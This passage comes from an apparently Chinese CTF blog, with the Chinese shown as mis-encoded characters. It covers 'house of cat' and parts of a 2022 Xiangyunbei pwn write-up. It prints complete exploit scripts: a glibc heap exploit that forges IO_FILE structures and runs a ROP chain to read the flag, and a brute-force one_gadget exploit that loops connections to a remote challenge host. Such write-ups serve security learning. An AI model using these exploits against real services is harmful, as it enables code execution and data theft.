ä¸­æ²¡æœ‰æåˆ°çš„ï¼Œå…¶ä½™éƒ¨åˆ†éƒ½å’Œ <code>house of apple2</code> ä¸­çš„åˆ©ç”¨æ€è·¯ç›¸ä¼¼ï¼Œå°±ä¸å†è¯¦ç»†è¯´æ˜ã€‚</p><h3 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h3><p>é™„ä»¶ï¼š</p><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4">https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4</a> æå–ç : ccp4 </p><h4 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041006987.png" alt="image-20230204100619768" style="zoom: 67%;" /><p>ä¿æŠ¤æ‹‰æ»¡ï¼Œæ²™ç®±æ˜¯ç™½åå•åªèƒ½æ‰“ <code>orw</code> ï¼Œéœ€è¦æ³¨æ„ä¸€ä¸‹ <code>read</code> çš„ç¬¬ä¸€ä¸ªå‚æ•°åªèƒ½è®¾ç½®ä¸º <code>0</code> ï¼Œæ‰€ä»¥æœ€åæ‰“ <code>orw</code> ä¹‹å‰éœ€è¦å…ˆ <code>close(0)</code></p><h4 id="ç¨‹åºé€»è¾‘"><a href="#ç¨‹åºé€»è¾‘" class="headerlink" title="ç¨‹åºé€»è¾‘"></a>ç¨‹åºé€»è¾‘</h4><p>ç¨‹åºæ˜¯ä¸€ä¸ªèœå•çš„å †é¢˜ï¼Œä¸è¿‡åœ¨ä½¿ç”¨ç¨‹åºçš„ä¸»è¦åŠŸèƒ½ä¹‹å‰ï¼Œéœ€è¦è¾“å…¥ä¸€äº›æ•°æ®æ¥ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼Œå¯èƒ½è‡ªå·±çš„é€†å‘èƒ½åŠ›è¿˜å¾—æé«˜å§ï¼Œåæ­£è¿™é‡Œçš„æ£€æŸ¥æˆ‘æ˜¯æäº†å¥½ä¹…ï¼Œç»“è®ºå°±æ˜¯æœ€å¼€å§‹è¾“å…¥ <code>LOGIN | r00t QWB QWXFadmin</code> å»è¿›è¡Œç™»å½•ï¼Œæ¥ä¸‹æ¥æ¯ä¸€æ¬¡è°ƒç”¨å…·ä½“åŠŸèƒ½ä¹‹å‰éƒ½è¦å‘é€ä¸€å¥ <code>CAT | r00t QWB QWXF$\xff</code> ,æ¥ä¸‹æ¥æ‰èƒ½å»æ‰§è¡Œæ­£å¸¸çš„åŠŸèƒ½ã€‚</p><p>åŠŸèƒ½ä¸€å…±æœ‰å››ä¸ª <code>add</code> <code>edit</code> <code>show</code> <code>delete</code> </p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041015973.png" alt="image-20230204101548907" style="zoom:50%;" /><p><code>edit</code> å‡½æ•°åªèƒ½ä½¿ç”¨ä¸¤æ¬¡ï¼Œå¹¶ä¸”åªèƒ½å†™å…¥ <code>0x30</code> å­—èŠ‚çš„æ•°æ®</p><p><code>delete</code> å‡½æ•°å­˜åœ¨ <code>UAF</code> æ¼æ´</p><p><code>add</code> å‡½æ•°ç”³è¯·çš„å †å—å¤§å°çš„èŒƒå›´æ˜¯ <code>0x418~0x46f</code> ï¼Œç”³è¯·å®Œå †å—åå¯ä»¥å‘é‡Œé¢å†™å…¥ <code>size</code> å­—èŠ‚çš„æ•°æ®</p><p><code>show</code> å‡½æ•°åªèƒ½æ³„éœ² <code>0x30</code> å­—èŠ‚çš„æ•°æ®</p><h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><ol><li>æ³„éœ² <code>libc</code> åœ°å€å’Œå †åœ°å€</li><li>åˆ©ç”¨ <code>edit</code> å‡½æ•°å®Œæˆç¬¬ä¸€æ¬¡ <code>large bin attack</code> å‘ <code>libc</code> ä¸­çš„å…¨å±€å˜é‡ <code>stderr</code> å†™å…¥ä¸€ä¸ªå †åœ°å€ï¼Œä»è€Œæ§åˆ¶ <code>_IO_2_1_stderr</code> ç»“æ„ä½“çš„å„ä¸ªå­—æ®µ</li><li>ç¬¬äºŒæ¬¡ <code>large bin attack</code> å»ç¯¡æ”¹ <code>top chunk</code> çš„ <code>size</code> å°†å…¶æ”¹ä¸ºéæ³•ï¼ˆè¦å¾€å°äº†æ”¹ï¼Œå› ä¸ºåªæœ‰ <code>top chunk</code> æ— æ³•æ»¡è¶³è¦ç”³è¯·çš„ <code>size </code> æ—¶ï¼Œæ‰ä¼šè§¦å‘ <code>sysmalloc</code>ï¼‰ <strong>æ³¨æ„ <code>large bin attack</code> æƒ³å°† <code>top chunk</code> çš„ <code>size</code> æ”¹å°çš„è¯ï¼Œéœ€è¦åœ°å€é”™ä½</strong></li><li>ç”³è¯·ä¸€ä¸ªå †å—ï¼Œæ­¤æ—¶æ‰§è¡Œ <code>__malloc_assert</code> è§¦å‘æ”»å‡»</li></ol><p>æ€è·¯ä¸éš¾ï¼Œéš¾ç‚¹åœ¨äºæ•´ä½“çš„ä¸€ä¸ªå †é£æ°´å’Œç»“æ„ä½“å¸ƒå±€éœ€è¦æ…¢æ…¢è°ƒè¯•ï¼Œå› ä¸ºæ–‡ç« å¼€å¤´å·²ç»è¯´æ˜äº†å¦‚ä½•é€šè¿‡ <code>__malloc_assert</code> è§¦å‘æ”»å‡»ï¼Œå‰©ä¸‹çš„å°±æ˜¯å…ˆåŠ«æŒ <code>_IO_2_1_stderr</code> ç»“æ„ä½“ï¼Œå°†å…¶çš„ <code>vtable</code> å­—æ®µæ”¹ä¸º <code>_IO_wfile_jumps+0x10</code>  åœ°å€ï¼Œç„¶å <code>_wide_data-&gt;vtable</code> æ”¹ä¸ºå¯æ§å †åœ°å€ï¼Œä½¿å…¶æ‰§è¡Œ <code>_IO_WOVERFLOW</code> çš„æ—¶å€™ï¼Œå¯ä»¥è¿›è¡ŒåŠ«æŒæ‰§è¡Œæµï¼ˆè¿™é‡Œåªè¯´æ˜äº†<strong>éƒ¨åˆ†ç¯¡æ”¹</strong>çš„å­—æ®µï¼‰</p><p>ç„¶åä¾ç„¶æ˜¯ <a href="https://zikh26.github.io/posts/19609dd.html">house of apple2</a> è¿™ç¯‡æ–‡ç« çš„ä¾‹é¢˜ä¸­æåˆ°çš„ç”¨ <code>magic_gadget</code> è¿›è¡Œä¸€ä¸ªæ ˆè¿ç§»ï¼ˆå¦‚æœéœ€è¦çœ‹å…·ä½“çš„ç»†èŠ‚è¯·å‚è€ƒ <code>house of apple</code> è¿™ç¯‡æ–‡ç« ï¼‰ï¼Œç„¶åå½»åº•æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµï¼Œå»æ‰“ <code>rop</code> é“¾ï¼Œæ‰§è¡Œ <code>close</code> <code>open</code> <code>read</code> <code>write</code> å‡½æ•°</p><p>æœ€åæˆ‘å‡ºç¤ºä¸€ä¸‹ä¼ªé€ çš„ä¸¤ä¸ªç»“æ„ä½“</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041045993.png" alt="image-20230204104522759" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048906.png" alt="image-20230204104823695" style="zoom:50%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048822.png" alt="image-20230204104835594" style="zoom:50%;" /><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">toolsæºç </a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0xd</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0xe</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0xe</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x21a0e0</span></span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">magic_gadget=libc_base+<span class="number">0x16a1fa</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">leave_ret=libc_base+<span class="number">0x00000000000562ec</span></span><br><span class="line">add_rsp_ret=libc_base+<span class="number">0x000000000003a889</span></span><br><span class="line">stderr_ptr=<span class="number">0x21a860</span>+libc_base</span><br><span class="line">lock=libc_base+<span class="number">0x21ba60</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall=libc_base+<span class="number">0xea5b9</span></span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_addr=libc_base+libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#close</span></span><br><span class="line">rop=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(close_addr)</span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0x1168</span>)<span class="comment"># &#x27;flag&#x27; address</span></span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rax_ret)</span><br><span class="line">rop+=p64(<span class="number">2</span>)</span><br><span class="line">rop+=p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(write_addr)</span><br><span class="line"></span><br><span class="line">wide_data=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">1</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">20</span></span><br><span class="line">wide_data+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(heap_base+<span class="number">0x1170</span>)<span class="comment">#wide_vtable</span></span><br><span class="line">wide_data+=p64(magic_gadget)<span class="comment">#first call</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">wide_data+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">wide_data+=p64(add_rsp_ret)</span><br><span class="line">wide_data+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0x1178</span>+<span class="number">0x30</span>+heap_base)<span class="comment">#second call</span></span><br><span class="line">wide_data+=p64(leave_ret)</span><br><span class="line">wide_data+=rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x1180</span>+<span class="number">0x30</span>)<span class="comment">#  rbp   io_save_base</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">io_file+=p64(lock)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x10a0</span>)<span class="comment">#wide_data</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io_file+=p64(libc_base+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)<span class="comment">#vtable</span></span><br><span class="line">io_file+=wide_data</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>,io_file)<span class="comment">#0xwfile 2160c0</span></span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0x460</span>,<span class="string">&#x27;prevent merge chunk&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(IO_list_all)+p64(stderr_ptr-<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&#x27;large bin attack chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#second large bin attack</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_base+<span class="number">0x2e20</span>)+p64(<span class="number">0x21a0e0</span>+libc_base)+p64(heap_base+<span class="number">0x2e20</span>)+p64(<span class="number">0x3265</span>-<span class="number">2</span>+heap_base-<span class="number">0x20</span>))</span><br><span class="line">  </span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0xe</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1F04</span>,<span class="number">0x1F10</span>,<span class="number">0x1EF8</span>,<span class="number">0x1EEC</span>,<span class="number">0x177F</span>) </span><br><span class="line">add(<span class="number">0xa</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x46f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x46f</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041055201.png" alt="image-20230204105543745"></p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/127290280">(44æ¡æ¶ˆæ¯) house of cat å­¦ä¹ _Nqoinaençš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
          <category> èµ›é¢˜WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¼ªé€ IO_FILE </tag>
            
            <tag> house of cat </tag>
            
            <tag> orw </tag>
            
            <tag> large bin attack </tag>
            
            <tag> malloc_assert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022_ç¥¥äº‘æ¯_pwn éƒ¨åˆ†wp</title>
      <link href="/posts/30a1c326.html"/>
      <url>/posts/30a1c326.html</url>
      
        <content type="html"><![CDATA[<h2 id="unexploitable"><a href="#unexploitable" class="headerlink" title="unexploitable"></a>unexploitable</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><img src="../img/image-20221029152901840.png" alt="image-20221029152901840" style="zoom:50%;" /><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><img src="../img/image-20221029153046424.png" alt="image-20221029153046424" style="zoom:50%;" /><p>å› ä¸ºç¨‹åºä»…ä»…æœ‰ä¸€ä¸ªreadå‡½æ•°ï¼Œæ²¡æœ‰canaryï¼Œè€Œä¸”æº¢å‡ºçš„å­—èŠ‚éå¸¸å¤§ï¼Œæ‰€ä»¥æœ¬é¢˜å¯ä»¥éšä¾¿æº¢ï¼Œä½†é—®é¢˜æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ï¼Œå¹¶ä¸”æ²¡æœ‰è¾“å‡ºå‡½æ•°ã€‚åœ¨å¼€äº†PIEçš„æƒ…å†µä¸‹ï¼Œå¾ˆå¤šèŠ±æ´»æ˜¯æ²¡æ³•ç”¨çš„ã€‚</p><p>é€šè¿‡è°ƒè¯•å‘ç°ï¼Œåœ¨mainå‡½æ•°è¿”å›åˆ°libc_start_mainå‡½æ•°çš„æ—¶å€™ï¼Œè¯¥åœ°å€æ˜¯ä¸€ä¸ªlibcåœ°å€ï¼Œè€Œè®©æ‰§è¡Œæµè·³åˆ°ä¸€ä¸ªåœ°å€å°±èƒ½get shellçš„åœ°å€åªæœ‰one_gadgetã€‚é€šè¿‡ç”¨setå‘½ä»¤æ›´æ”¹å†…å­˜çš„å€¼ä¸ºone_gadgetï¼Œå‘ç°ç¬¬ä¸€ä¸ªone_gadgetå°±èƒ½ç”¨(å¦‚ä¸‹)</p><img src="../img/image-20221029153558694.png" alt="image-20221029153558694" style="zoom:50%;" /><p>äºæ˜¯æ€è·¯å°±æ˜¯å°†libc start mainçš„åä¸‰å­—èŠ‚ï¼Œæ”¹ä¸ºone_gadgetåœ°å€(ç”±äºlibcåœ°å€åä¸‰ä½æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦çˆ†ç ´å‰ä¸‰ä½ï¼Œæ¦‚ç‡ä¸º1&#x2F;4096)ã€‚</p><p>ä½†å¦‚æœæˆ‘ä»¬å•çº¯çš„å¡«åƒåœ¾æ•°æ®ï¼Œç„¶åæº¢å‡ºç¯¡æ”¹çš„è¯ï¼Œæƒ…å†µå¦‚ä¸‹</p><img src="../img/image-20221029154216496.png" alt="image-20221029154216496" style="zoom:50%;" /><p>å³ä½¿æˆ‘ä»¬æº¢å‡ºç¯¡æ”¹äº†libc_start_main,ä¹Ÿä¼šè¿”å›åˆ°å®ƒä¸Šé¢çš„åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©æ‰§è¡Œæµæ»‘åˆ°libc_start_mainä¸Šï¼Œå¼€äº†PIEä¿æŠ¤ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è·å–retæŒ‡ä»¤çš„åœ°å€ï¼Œä½†æ˜¯vsyscallçš„åœ°å€å§‹ç»ˆæ˜¯å›ºå®šçš„ï¼Œå®ƒå¯ä»¥å½“åšretæŒ‡ä»¤æ¥ç”¨ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æŠŠä¸Šå›¾çš„0xdeadbeefæ”¹æˆvsyscallçš„åœ°å€å³å¯ï¼Œæ‰§è¡Œåˆ°vsyscallçš„æ—¶å€™å°±å¯ä»¥å¾€ä¸‹æ»‘åˆ°çˆ†ç ´æˆåŠŸçš„one_gadgetï¼Œä»è€Œè·å–shellã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    payload=p64(<span class="number">0xdeadbeef</span>)*<span class="number">3</span>+p64(<span class="number">0xffffffffff600000</span>)*<span class="number">2</span>+<span class="string">b&#x27;\xa5\x22\x06&#x27;</span></span><br><span class="line">    <span class="comment">#debug(p)</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">    a=p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&quot;101.201.71.136&quot;</span>,<span class="number">41614</span>)</span><br><span class="line">        <span class="comment">#p=process(&quot;./unexploitable&quot;)</span></span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure><p><img src="/../img/image-20221029155442239.png" alt="image-20221029155442239"></p><p>hhhhï¼Œè¿æ°”ä¸å¤Ÿï¼Œç»ˆç«¯æ¥å‡‘ï¼Œå¼€äº†12ä¸ªï¼Œçˆ†äº†å…­ä¸ƒåˆ†é’Ÿã€‚</p><h2 id="sandboxheap"><a href="#sandboxheap" class="headerlink" title="sandboxheap"></a>sandboxheap</h2><h3 id="ä¿æŠ¤ç­–ç•¥ï¼š-1"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š-1" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h3><p><img src="/../img/image-20221030114249283.png" alt="image-20221030114249283"></p><h3 id="æ²™ç®±åˆ†æï¼š"><a href="#æ²™ç®±åˆ†æï¼š" class="headerlink" title="æ²™ç®±åˆ†æï¼š"></a>æ²™ç®±åˆ†æï¼š</h3><p>å› ä¸ºæœ¬äººæ¯”è¾ƒèœï¼Œç¬¬ä¸€æ¬¡è§åˆ°é¢˜ç›®ç»™çš„è¿™ç§æ²™ç®±æ–‡ä»¶ï¼Œå†åŠ ä¸Šæ¯”è¾ƒå¥½å¥‡ï¼Œå°±ç ”ç©¶äº†ä¸€ç•ªï¼Œå¤§è‡´çš„åˆ†æè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>é€šè¿‡æŸ¥é˜…èµ„æ–™å‘ç°ptrace(PTRACE_GETREGS, child_pid, NULL, &amp;regs)çš„ç¬¬å››ä¸ªå‚æ•°æ˜¯&amp;regsï¼Œè€Œè¿™ä¸ªregsæ˜¯åœ¨ptrace.hå®šä¹‰çš„ä¸€ä¸ªç»“æ„ä½“user_regs_struct(ç”¨æ¥ä¿å­˜å„ä¸ªå¯„å­˜å™¨çš„å€¼)ï¼Œæˆ‘ä»¬å†å»çœ‹ä¸‹IDAé‡Œçš„ä¼ªä»£ç (å¦‚ä¸‹)ï¼Œå‘ç°ç¬¬å››ä¸ªå‚æ•°æ˜¯v8ï¼Œå› æ­¤åˆ¤æ–­v8å°±æ˜¯user_regs_structç»“æ„ä½“</p><img src="../img/image-20221031093052357.png" alt="image-20221031093052357" style="zoom:50%;" 